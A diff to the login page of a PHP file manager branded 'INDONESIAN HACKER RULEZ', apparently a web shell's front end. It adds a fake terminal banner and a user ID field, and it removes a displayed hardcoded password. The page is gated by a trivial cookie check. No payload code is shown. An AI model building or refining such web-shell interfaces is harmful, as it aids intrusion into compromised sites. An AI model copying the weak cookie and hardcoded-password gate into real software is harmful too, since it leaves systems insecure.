@@ -419,6 +419,21 @@ if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
             <div class="logo">◢ INDONESIAN HACKER RULEZ ◣</div>
             <div class="subtitle"></> PHP FILEMANAGER </></div>
         </div>
+
+        <!-- Terminal Simulation -->
+        <div class="terminal-line">> Initializing secure connection...</div>
+        <div class="terminal-line">> Quantum encryption enabled</div>
+        <div class="terminal-line">> Awaiting filemanager authorization...</div>
+
+        <!-- Login Form -->
+        <form id="loginForm" method="POST" action="">
+            <div class="form-group">
+                <label class="form-label">
+                    <i class="fas fa-user-secret"></i> USERS ID
+                </label>
+                <input type="text" name="user_id" class="form-input" placeholder="Enter your user identifier" required>
+            </div>
+
             <div class="form-group">
                 <label class="form-label">
                     <i class="fas fa-key"></i> Key Code
@@ -443,7 +458,7 @@ if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
             </div>
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                LOG IN WITH PASSWORD : PASSWORDADMIN@123
+                Establishing filemanager connection...
             </div>
         </div>
     </div>
